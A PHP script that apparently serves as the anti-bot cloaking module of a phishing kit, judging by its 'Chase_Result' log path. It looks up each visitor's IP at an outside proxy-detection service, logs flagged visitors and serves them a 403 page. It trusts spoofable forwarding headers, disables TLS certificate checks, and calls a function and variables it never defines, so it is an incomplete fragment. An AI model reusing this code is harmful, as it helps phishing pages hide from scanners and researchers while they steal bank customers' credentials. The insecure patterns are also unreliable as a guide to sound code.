<?php
$random_id = sha1(rand(0,1000000));
function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $v_ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $v_ip = $forward;
    }
    else
    {
        $v_ip = $remote;
    }

    return $v_ip;
}

$v_ip = getUserIPs();

    $url = "https://blackbox.ipinfo.app/lookup/".$v_ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $result = $resp;
        if($result == "Y") {
            $content = "proxyblock - $v_ip \r\n";
		    $save=fopen("bot.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
            tulis_file("East/Chase_Result/os/total_bot.txt","$v_ip|$countrycode|$ispuser|$os|");
            header('HTTP/1.0 403 Forbidden');
            die('Proxyblock Forbidden.');
                exit();
            }

?>
